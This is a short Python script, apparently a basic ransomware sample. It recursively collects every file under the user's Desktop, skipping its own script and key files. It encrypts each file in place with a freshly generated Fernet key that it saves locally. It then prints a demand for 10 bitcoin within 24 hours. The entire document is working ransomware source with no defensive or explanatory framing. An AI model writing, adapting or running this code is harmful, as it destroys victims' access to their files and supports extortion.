import os
from cryptography.fernet import Fernet

files = []

def filelist(path):
    for file in os.listdir(path):
        full_path = os.path.join(path, file)
        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        elif os.path.isfile(full_path):
            files.append((path, file))
        else:
            filelist(full_path)

# Provide the absolute path of the Desktop directory
root_directory = os.path.expanduser("~/Desktop")
filelist(root_directory)

key = Fernet.generate_key()
with open("thekey.key", "wb") as f:
    f.write(key)

# Encrypt all files in the files list.
for path, file in files:
    full_path = os.path.join(path, file)
    with open(full_path, "rb") as f:
        contents = f.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(full_path, "wb") as f:
        f.write(encrypted_contents)

print("Your files are all encrypted!!! Send 10 bitcoin in the next 24 hours to unlock your files.")